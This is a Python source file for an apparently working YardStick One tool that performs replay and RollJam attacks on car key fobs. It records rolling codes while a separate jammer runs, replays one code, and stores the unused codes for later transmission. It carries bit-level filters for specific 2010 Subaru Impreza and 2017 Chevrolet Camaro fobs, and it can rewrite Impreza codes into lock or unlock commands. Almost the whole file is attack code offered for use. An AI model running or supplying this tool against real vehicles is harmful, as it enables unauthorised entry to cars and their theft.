import argparse
import os
import sys
import time
import bitstring
from rflib import *
from struct import *


def main():
    parser = argparse.ArgumentParser(description="Replay and rolljam attacks against car key fobs with the yardstick one. Jammer for rolljam not included; check README.md for options and usage")
    parser.add_argument("functions", choices=['replay', 'rolljam'], help="Replay: Capture everything on a certain frequency and replay it upon pressing enter. | Rolljam: Capture codes and replay the first automatically. Saves remaining codes to use later, and for certain cars these can be altered (Use rolljam with -r or -t to save to/transmit from a file)")

    parser.add_argument("-b", "--baudrate", action="store", type=int, default="4000", help="Default=4800 | Set how quickly bits are read and transferred")
    parser.add_argument("-f", "--frequency", action="store", type=int, default="315000000", help="Default=315mhz | Set the frequency to receive and transmit on")
    parser.add_argument("-m", "--modulation", action="store", type=str, default="MOD_ASK_OOK", help="Default=ASK_OOK |  Set type of (de)modulation")
    parser.add_argument("-s", "--sleep", action="store", type=int, default="20", help="Default=20 | Changes how many codes are captured before being asked to continue")

    parser.add_argument("-c", "--car", action="store", type=str, help="Specify a supported car type for extra functionality. Can be used with --transmit. Use -c list to see all supported cars (rolljam)")
    parser.add_argument("-r", "--receive", action="store", type=str, help="Receive radio frequencies and log to file (rolljam)")
    parser.add_argument("-t", "--transmit", action="store", type=str, help="Transmit a code from a file. Can be used with --car to change the single code (rolljam)")
    args = parser.parse_args()

    #list available cars if --car list specified
    if args.car=='list':
        list()
        exit(0)

    #if replay is specified, -c, -t, an -r will not be used
    if args.functions=='replay':
        replay(args.frequency, args.baudrate, args.modulation, args.sleep)
        exit(0)

    if args.functions=='rolljam':
        #exits if attempt made to receive and transmit at same time
        if args.receive!=None and args.transmit!=None:
            print("You must choose between receiving or transmitting")
            exit(1)

        #records codes and writes to file, tells how many codes written
        elif args.receive!=None:
            #DEBUG signal = "test\nlines\ngo\nbrrrr"
            signal = roll_receive(args.frequency, args.baudrate, args.modulation, args.sleep, False, None)
            #open file to write codes to
            with open(args.receive, "w") as f1:
                f1.write(signal)
                f1.close()
            #count how many codes written to file and notify user
            print("Wrote "+str(len(open(args.receive).readlines()))+" codes to "+args.receive)
            exit(0)

        #transmits a code either for a specific car (user can change code then)
        #or just transmit next code in file (removes first line of file)
        elif args.transmit!=None:
            #check if file to transmit from exists
            if not os.path.isfile(args.transmit):
                print("[-] File not found")
                exit(1)
            #read from file and set signal to codes in file
            with open(args.transmit, "r") as f1:
                signal = f1.read()
                f1.close()
            #turn codes into a list
            codes = signal.split("\n")
            #if the file is empty, exit
            if len(codes)==0 or (len(codes)==1 and len(codes[0])==0):
                print("[-] No codes found in "+str(args.transmit))
                exit(1)
            #if a car is specified then filter out codes for that car and check if the code can be altered
            if args.car!=None:
                codes = filter(args.car, codes)
                new_code = rolljam_car(args.car, codes[0])
                roll_transmit(args.frequency, args.baudrate, args.modulation, new_code)
            #if no car specified then just transmit first code in signal list
            else:
                roll_transmit(args.frequency, args.baudrate, args.modulation, codes[0])
            #remove first code from file
            updated_codes = []
            for c in codes[1:]:
                updated_codes.append(c)
            data=""
            for c in updated_codes:
                data += c+"\n"
            data = data.rstrip("\n")
            #overwrite file with one less code
            with open(args.transmit, "w") as r1:
                r1.write(data)
                r1.close()
            #check how many codes left in the file and print to screen
            print("[+] Your file has "+str(len(updated_codes))+" codes left")
            exit(0)

        #go into rolljam looping function if using rolljam without -r or -t
        else:
            rolljam(args.frequency, args.baudrate, args.modulation, args.car, args.sleep)



def replay(frequency, baudrate, modulation, rsleep):
    #rfcat setup
    d = RfCat()
    d.setFreq(frequency)
    #not sure what type of var modulation needs to be, so here's a workaround
    if modulation=="MOD_2FSK":
        d.setMdmModulation(MOD_2FSK)
    else:
        d.setMdmModulation(MOD_ASK_OOK)
    d.setMdmDRate(baudrate)
    d.setMaxPower()
    d.lowball()

    #function to receive codes
    #slp increments to eventually ask user if they'd like to continue capture
    slp=0
    i="y"
    signal=[]
    hex_codes=""
    while i=="y":
        #try to receive codes
        try:
            rfcode,t = d.RFrecv()
            #encode all signals as hexadecimal
            hex_codes = rfcode.encode("hex")
            #DEBUG print(hex_codes)
        #passes exception when yardstick one not detected
        except ChipconUsbTimeoutException:
            pass
        slp+=1
        signal.append(hex_codes)
        #when sleep counter is reached, prompt user to continue or not
        if slp==(rsleep/2):
            i=raw_input("Would you like to continue the capture? (y)es  (n)o ")
            slp=0
    codeline = ""
    #put all codes found from the capture onto one line
    for c in signal:
        codeline += c
    #DEBUG print(codeline)
    #split codes by 5 or more f's
    codes = re.split("fffff*", codeline)

    #formatting
    for code in codes:
        #DEBUG print(code)
        #make code an even number of hex numbers
        if len(code)%2 != 0:
            code = "0"+code
        raw_code = ""
        #any code that isn't noise, convert from string to raw bytes
        if len(code)>20:
            binary = bin(int(code,16))[2:]
            raw_code = bitstring.BitArray(bin=(binary)).tobytes()
        else:
            continue
        #transmitting
        #print code to be transmitted and transmit raw code
        print("[+] Sending code "+str(code))
        d.RFxmit(raw_code+"\x00\x00\x00\x00\x00\x00")
        print("[+] Sent")


def rolljam(frequency, baudrate, modulation, car, rsleep):
    #user must start jammer separately; rfcat starts receiving with transmit at end set to true
    print("Start your jammer...")
    time.sleep(1)
    signal=roll_receive(frequency, baudrate, modulation, rsleep, True, car)
    #count codes received by lines
    print("[+] Received "+str(len(signal.splitlines()))+" codes")
    #remove first code from codes as it has been transmitted
    codes = signal.split("\n")
    less_codes=[]
    for c in codes[1:]:
        less_codes.append(c)
    codes=less_codes
    #go into loop of transmitting remaining codes or exit and save; working on getting rid of NameError that clogs up terminal output
    i="i"
    while i!="e" and (len(codes)>0 or len(codes)==1 and len(codes[0]) is not 0):
        #print codes left and give user option to transmit or exit
        i = raw_input("\nYou have "+str(len(codes))+" codes left.\nWhat would you like to do? (t)ransmit  (e)xit: ")
        #power on yardstick needs cycled for each new transmission (unplug for a couple seconds then plug back in)
        if i=="t":
            #check for car specification to filter/change code, remove first code from list after transmission
            less_codes=[]
            if car is not None:
                codes = filter(car, codes)
                new_code = rolljam_car(car, codes[0])
                roll_transmit(frequency, baudrate, modulation, new_code)
            else:
                roll_transmit(frequency, baudrate, modulation, codes[0])
            for c in codes[1:]:
                less_codes.append(c)
            codes=less_codes

        elif i=="e":
            #ask to save remaining codes to file
            saving = raw_input("Would you like to save the remaining codes? (y)es  (n)o: ")
            if saving == ("y" or "yes"):
                #prompt for filename to save to
                filename = (raw_input("File name: "))
                #write data to file with newline delimiters
                data=""
                for c in codes:
                    data += c+"\n"
                data = data.rstrip("\n")
                with open(filename, "w") as f_end:
                    f_end.write(data)
                    f_end.close()
                #output number of codes saved, then exit
                print("[+] Saved "+filename+" with "+str(len(codes))+" codes")

    #exit if last code was transmitted or the last line in a file was just an extra newline character
    if len(codes)==0:
        if len(codes)==1:
            if len(codes[0])==0:
                print("[-] Last code was empty")
        else:
            print("[-] Ran out of codes")
    else:
        print("Exiting")
    exit(0)


#receives til user hits enter, then sorts codes out separated by newlines
def roll_receive(frequency, baudrate, modulation, rsleep, transmit, car):
    #rfcat setup
    d = RfCat()
    d.setFreq(frequency)
    #not sure what type of var modulation needs to be, so here's a workaround
    if modulation=="MOD_2FSK":
        d.setMdmModulation(MOD_2FSK)
    else:
        d.setMdmModulation(MOD_ASK_OOK)
    d.setMdmDRate(baudrate)
    d.setMaxPower()
    d.lowball()

    #function to receive codes (similar to replay, which is more commented)
    slp=0
    i="y"
    signal=[]
    #fixing "hex codes referenced before assignment" error
    hex_codes=""
    while i=="y":
        try:
            rfcode,t = d.RFrecv()
            hex_codes = rfcode.encode("hex")
            print(hex_codes)
        except ChipconUsbTimeoutException:
            pass
        slp+=1
        signal.append(hex_codes)
        if slp==(rsleep/2):
            i=raw_input("Would you like to continue the capture? (y)es  (n)o ")
            slp=0
    codeline = ""
    for c in signal:
        codeline += c
        #DEBUG  print(codeline)
    codes = re.split("fffff*", codeline)
    #Perhaps add more splitting by several 000's on top of fff's
    #codes = re.split("0000000000000000000000000000000000*", codes1)

    #formatting
    i=0
    signal_list=[]
    for code in codes:
        if len(code)%2 != 0:
            codes[i] = "0"+code
        i+=1
        raw_code = ""
        if len(code)>20 and code not in signal_list:  #may need changed if smaller codes found
            signal_list.append(code)
        signal = "\n".join(signal_list)
    #if no codes were received, exit
    if len(signal)==0:
        print("[-] Received 0 codes")
        exit(1)
    #DEBUG print(signal)
    #added since yardstick one needs to be unplugged and plugged back in upon every use
    if transmit is True:
        #check if a car was specified to filter codes for
        if car is not None:
            transmit_codes = filter(car, signal)
            transmit_code = transmit_codes[0]
        else:
            transmit_code=signal_list[0]
        #allow user to stop jamming before sending anything
        print("Stop jamming...")
        raw_input("Press enter when you are ready to continue")
        #send first code in file to allow target keyfob to complete its intended action
        binary = bin(int(transmit_code, 16))[2:]
        raw_code = bitstring.BitArray(bin=(binary)).tobytes()
        #transmitting
        print("[+] Sending code "+str(code))
        d.RFxmit((raw_code+"\x00\x00\x00\x00\x00\x00")*10)
        print("[+] Sent")
    return signal  #codes separated by newlines


#transmits one code
def roll_transmit(frequency, baudrate, modulation, code):
    #rfcat setup
    d = RfCat()
    d.setFreq(frequency)
    #not sure what type of var modulation needs to be, so here's a workaround
    if modulation=="MOD_2FSK":
        d.setMdmModulation(MOD_2FSK)
    else:
        d.setMdmModulation(MOD_ASK_OOK)
    d.setMdmDRate(baudrate)
    d.setMaxPower()
    d.lowball()
    #formatting
    binary = bin(int(code, 16))[2:]
    raw_code = bitstring.BitArray(bin=(binary)).tobytes()
    #transmitting raw bytes
    print("[+] Sending code "+str(code))
    d.RFxmit((raw_code+"\x00\x00\x00\x00\x00\x00")*10)
    print("[+] Sent")


#prints list of supported cars
def list():
    print("""-----Car List-----
impreza - tested on 2010 Subaru Impreza (filter+alter codes)
camaro - tested on 2017 Chevrolet Camaro (filter codes)
mustang - testong on 2006 Ford Mustang (filter codes)
""")


#edits code sent to function to change it's functionality
#may have to convert hex to bin and back to hex
def rolljam_car(car, code):
    #ask what type of code would like to be sent
    command = raw_input("Would you like to: open (t)runk, (p)anic alarm, (l)ock, (u)nlock: ")
    if car=='impreza':
        #lock and unlock needs tested (no longer have access to impreza), trunk and panic alarm need to be added
        #iterate through filtered code to find bits used to lock/unlock/etc and change given bits to code needed. then join code back together as it needs to be
        if command=="l":
            i=160
            n_code=[]
            while i < 300:
                if i==244:
                    #lock bits
                    n_code.append('10101100')
                    i=252
                else:
                    n_code.append(code[i])
                    i+=1
            joined_code = "".join(n_code)
            #recreate code with changed bits
            full_code = (('1010'*41)+joined_code+('0'*9)+joined_code)
            new_code = hex(int(full_code, 2))
        elif command=="u":
            i=160
            n_code=[]
            while i < 300:
                if i==244:
                    #unlock bits
                    n_code.append('10110010')
                    i=252
                else:
                    n_code.append(code[i])
                    i+=1
            joined_code = "".join(n_code)
            #recreate code with changed bits
            full_code = (('1010'*41)+joined_code+('0'*9)+joined_code)
            new_code = hex(int(full_code, 2))
        elif command=="t":
            #TODO need another subaru impreza (2010) to get codes from
            new_code = code
        elif command=="p":
            #TODO need another subaru impreza (2010) to get codes from
            new_code = code
    #if not one of the cars above was specified, return unaltered code
    else:
        print("[-] Changing codes not supported")
        return code
    #if something besides an above option entered, return unaltered code
    if command!="l" and command!="u" and command!="t" and command!="p":
        print("[-] Unknown command, code will remain unchanged.")
        return code
    #return altered code
    print("[+] Code changed for ",car)
    return new_code


#filter out any codes in a list not pertaining to the specified car
def filter(car, codes):
    filtered_codes=[]
    #use regex to filter out subaru codes
    if car=='impreza':
        print("Filtering codes for "+car)
        for c in codes:
            binarycode=bin(int(c, 16))
            #checks if subaru code is formatted correctly
            rc = re.search('1010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101101010011010100110101010100110101010010101011010100101101001100[0-1]{8}1010101010101010110011001101[0-1]{17,20}', binarycode)
            if rc is not None:
                #ensures code isn't messed up by how it's spaced with 9 '0' bits (yard stick may detect noise during that time)
                uc = re.search('10101010101010101101010011010100110101010100110101010010101011010100101101001100[0-1]{8}1010101010101010110011001101[0-1]{17,20}', rc.group(0))
                if uc is not None:
                    #recreate code with 9 '0' bits in-between
                    clean_code = (('1010'*41)+uc.group(0)+('0'*9)+uc.group(0))
                    filtered_codes.append(hex(int(clean_code, 2)))

    #if camaro specified, filter out by known format for 2017 camaro
    elif car=='camaro':
        print("Filtering codes for "+car)
        for c in codes:
            rc = re.search('100110011001100110011001100110011001100110011001100110011001100110011001100110011001100101011001010101100101100101010101100110100101011010010110[0-1]{139,146}', bin(c))
            if rc is not None:
                #only adds filtered codes to new list
                filtered_codes.append(hex(int(rc.group(0), 2)))

#    elif car=='mustang':
#        TODO MUSTANG filter

    #exit if unsupported car specified
    else:
        print("[-] Car not supported")
        exit(1)

    #if no codes remain after being filtered, exit
    if len(filtered_codes)==0:
        print("[-] No codes found")
        exit(1)

    return filtered_codes



if __name__ == "__main__":
    main()
